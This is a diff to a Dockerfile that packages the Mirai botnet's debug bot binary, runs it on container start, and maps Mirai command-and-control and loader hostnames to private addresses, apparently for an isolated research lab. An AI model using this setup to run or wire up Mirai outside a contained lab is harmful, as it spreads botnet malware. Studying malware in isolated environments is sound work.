@@ -2,8 +2,10 @@ FROM debian:jessie-slim
 ADD ./source/mirai/debug/mirai.dbg /bot
 RUN apt-get -y update \
 	&& apt-get upgrade -y \
-	&& apt-get install -y wget bzip2 nano telnet\
-	&& apt-get install -y dnsutils net-tools
+	&& apt-get install -y wget bzip2 nano telnet \
+	&& apt-get install -y dnsutils net-tools \
+	&& echo "172.25.0.2 cnc.mirai.com cnc" >> /etc/hosts\
+	&& echo "172.25.0.4 load.mirai.com load" >> /etc/hosts
 # CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` && CNC=`nslookup cnc | awk '/^Address: / { print $2 }'` && /bot $CNC $IP $CNC 0
 # CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` && CNC=`172.17.0.2'` && /bot $CNC $IP $CNC 0
 CMD /bot
